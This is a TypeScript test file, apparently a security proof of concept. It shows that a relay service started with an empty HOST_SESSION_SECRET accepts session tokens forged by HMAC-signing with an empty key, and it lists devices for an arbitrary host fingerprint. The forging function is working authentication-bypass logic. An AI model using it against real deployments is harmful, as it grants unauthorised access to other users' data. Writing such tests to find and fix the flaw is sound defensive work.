import { createHmac } from 'node:crypto'
import { afterAll, beforeAll, expect, it } from 'vitest'
import { describePoc } from './poc-opt-in'
import { newHostKeypair, startRelayUnderTest, type RelayUnderTest } from './relay-attack-surface'

let relay: RelayUnderTest

// With an empty HOST_SESSION_SECRET the session MAC is keyed by nothing, so any client can mint one.
function forgeEmptySecretSession(hostFingerprint: string): string {
  const expiresAt = Date.now() + 60 * 60 * 1000
  const signature = createHmac('sha256', '')
    .update(`seal-host-session/v1\0${hostFingerprint}\0${expiresAt}`)
    .digest('base64url')
  return `${hostFingerprint}.${expiresAt}.${signature}`
}

describePoc('PoC SR-06b: the Worker boots with an empty HOST_SESSION_SECRET', () => {
  beforeAll(async () => {
    relay = await startRelayUnderTest({ HOST_SESSION_SECRET: '' })
  })
  afterAll(async () => {
    await relay?.dispose()
  })

  it('a forged session with no key is accepted by the push API', async () => {
    const fingerprint = newHostKeypair().publicKeyB64
    // Any 16-char host fingerprint; use a fresh key's derived id shape via listDevices on an empty host.
    const victimFingerprint = 'AbCdEf0123_-xyZ9'
    void fingerprint
    const listed = await fetch(`${relay.origin}/v1/devices`, {
      headers: { authorization: `Bearer ${forgeEmptySecretSession(victimFingerprint)}` }
    })
    expect(listed.status).toBe(200)
    expect(await listed.json()).toEqual({ devices: [] })
  })
})
